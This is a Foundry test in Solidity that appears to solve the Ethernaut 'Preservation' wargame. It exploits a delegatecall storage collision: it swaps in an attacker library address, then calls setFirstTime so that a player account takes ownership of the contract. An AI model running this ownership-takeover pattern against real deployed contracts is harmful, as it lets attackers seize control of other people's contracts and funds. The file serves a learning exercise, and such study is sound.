// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Preservation, LibraryContract} from "../src/Preservation.sol";
import {PreservationAttack} from "../src/PreservationAttack.sol";

contract PreservationTest is Test {
    function testPreservation() public {
        LibraryContract timeZone1 = new LibraryContract();
        LibraryContract timeZone2 = new LibraryContract();

        PreservationAttack attack = new PreservationAttack();

        console.log("timeZone1 %s, timeZone2 %s, attack %s", address(timeZone1), address(timeZone2), address(attack));

        Preservation preservation = new Preservation(address(timeZone1), address(timeZone2));

        console.log("preservation timeZone1 %s, timeZone2 %s", preservation.timeZone1Library(), preservation.timeZone2Library());

        preservation.setSecondTime(uint256(uint160(address(attack))));
        console.log("preservation timeZone1 %s, timeZone2 %s", preservation.timeZone1Library(), preservation.timeZone2Library());

        address player = makeAddr("player");
        vm.startPrank(player, player);

        preservation.setFirstTime(0x00);

        vm.stopPrank();

        console.log("owner %s, player %s", preservation.owner(), player);
        assert(preservation.owner() == player);
    }
}